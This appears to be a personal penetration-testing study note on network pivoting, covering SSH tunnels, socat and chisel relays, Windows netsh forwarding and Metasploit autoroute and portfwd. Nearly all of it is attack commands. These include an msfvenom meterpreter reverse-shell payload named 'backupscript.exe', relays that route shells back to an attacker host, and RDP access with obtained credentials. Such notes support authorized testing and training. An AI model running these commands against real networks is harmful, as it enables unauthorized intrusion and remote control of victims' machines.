- **tags:** #pivoting #metasploit 
- -----------
# One-liner definition
Pivoting allows us to delve deeper into the networks accessing previously unreachable environments.
# Pivoting with ssh
## ssh local port forwarding
With the `-L` switch we can specify which local port we would like to forward all its requests to a remote machine.
```bash
ssh -L <localport>:<targets interface>:<remote port> <username>@<hostname> 
```
Let's say we've got the ssh credentials of a machine that is running a [[MySQL|MariaDB]] server closed to the public. We can take advantage of [[ssh]] port forwarding so we can later start enumerating the service and execute a remote payload. 
![[LocalPortForwarding.png]]
## ssh dynamic port forwarding
```bash
ssh -D 9050 <username>@<hostname> -N &
```
With dynamic port forwarding, we can send packets to a remote network via a pivot host.The attack host starts the SSH client and requests the [[SSH]] server to allow it to send some *TCP* data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on `localhost:9050`. Using [[proxychains]] we are going to redirect our traffic to port *9050* through a `SOCKS` connection.

- *Note:* **SOCKS** is an Internet protocol that exchanges network packets between a client and server through a proxy server. SOCKS5 optionally provides authentication so only authorized users may access a server. Practically, a SOCKS server *proxies* *TCP* connections to an arbitrary IP address, and provides a means for *UDP* packets to be forwarded.

Once we setup the relay for all our traffic, we can start scanning new reachable targets.
```bash
proxychains nmap -v -Pn -sT <targetIP>
```
**Important:** Only full *TCP* scans will work when pivoting using [[proxychains]].
## ssh reverse port forwarding
Let's imagine that during our scan in a foreign network (via a pivot host) we've found a target vulnerable to RCE and we want to establish a reverse shell with the target. Our first step would lay on the creation of the payload (for this example I'll be using [[msfvenom]] to generate a *meterpreter*).
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<InternalsPivotIP> -f exe -o backupscript.exe LPORT=8080
```
In this case our **listener's IP** will correspond to the *pivot's internal IP*. The second step is to find a valid vector to transfer the payload to the victim's machine. Next we need to **redirect** the traffic that'll be sent from the **victim**'s IP on port *8080* to our local machine; one can achieve such thing via [[ssh]] with the following command:
```bash
ssh -R <pivotIP>:8080:0.0.0.0:8000 <username>@<hostname> -Nv #Reversing all traffic to our local port 8000
```
Lastly, all is left is to setup the *meterpreter's* listener on `msfconsole` and execute the payload on the victim.
# Socat Redirection
[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
## Gaining a reverse shell with socat
```bash
#create a relay pipe on the pivot
socat TCP4-LISTEN:4444,fork TCP4:<LHOST>:<LPORT> 
```
## Bind Shell Using Socat
```bash
#on victim start listener offering shell
#create a relay pipe on the pivot
socat TCP4_LISTEN:4444,fork TCP4:<RHOST>:<RPORT>
```
# Pivoting with chisel
```bash
#on attacker
chisel server --reverse -p 1234
#on pivot brings all ports
chisel client <LHOST>:1234 R:socks
```
## Chaining Several Pivots
Important, order hosts from furthest to nearest on the `/etc/proxychains.conf` file and make sure *Dynamic Chains* is ON.
```bash
# on second victim
chisel client <PIVOT INTERNAL ADDRESS>:2222 R:1081:socks

# on middle victim
socat tcp4-listen:2222,fork tcp4:<LHOST>:1234
```
# Port Forwarding on Windows Hosts
To enable local port forwarding on a Windows Pivot we are going to take advantage of the *netsh.exe* batch command:
```shell
# add portfwd to rdp to Unreachable Host
netsh.exe interface portproxy add v4tov4 listenaddress=<External Address of Pivot> listenport=8080 connectaddress=<Unreachable Host> connectport=3389

# check that settings are correct
netsh.exe interface portproxy show v4tov4

# now we can rdp from our attacker's machine
xfreerdp /v:<External Address of Pivot>:8080 /u:'Username' /p:'Password'
```
# Pivoting with Metasploit
Now let us consider a scenario where we have our *Meterpreter* shell access on the the pivot host, and we want to perform enumeration scans through the pivot host, but taking advantage of the conveniences that *Meterpreter* sessions bring us.
## Setup SOCKS Proxy and Autoroute traffic
Background the *meterpreter* session and look for the `auxiliary/server/socks_proxy` module. Setup the options, I normally use port *9050* on my [[proxychains]] config file for proxying my traffic with *SOCKS*.
```bash
set SRVHOST 127.0.0.1
set SRVPORT 9050
set version 4a #use socks4
```
Check that the module is running in the background issuing the `jobs` command. Finally to route all traffic through our meterpreter session run the *autoroute* script.
```bash
sessions list
sessions -i 1 #choose the number of the session you are interested on using
run autoroute -s 172.16.5.0/23 #in your case define the subnnet you are interested on routing your traffic to
```
To ensure that the route has been successfully added  type: `run autoroute -p`. If there were no mistakes made, now we should be able to use [[nmap]] combined with [[proxychains]] to start enumerating the new reachable hosts.
```bash
proxychains nmap -sT -n -Pn --top-ports 100 <IPTarget>
```
## PortForwarding using a meterpreter session
Let's suppose than on the previous [[nmap]] scan we found that port *3389* is open presumably running an [[Remote Desktop Protocol|RDP]] server. In this case we would like to forward the victim's [[Remote Desktop Protocol|RDP]] port to a local port of our choosing. Achieving such things with a *meterpreter* session is quite easy.
```bash
portfwd -h #list all available options
portfwd add -l 3389 -p 3389 -r <IPTarget> #binding local port 3389 with the victim's port
portfwd list #list forwarded/reversed ports
```
Now, if an attacker had valid credentials, he could easily connect to the *RDP* server using [[Remote Desktop Protocol]]
```bash
xfreerdp /u:<username> /p:<password> /v:localhost
```
## Reverse PortForwarding using a meterpreter session
Lastly it's now time to gain a *meterpreter* shell with the remote victim. After generating our payload and transferring it over to the host we establish a reverse port forwarding rule.
```
portfwd add -R -l <listeningPort> -p <portDesignedonPayload> -L <attackerIP> 
```
Before executing the payload, *background* the current *meterpreter session* and start a new `exploit/multi/handler`, listening on the port and network interface previously specified.


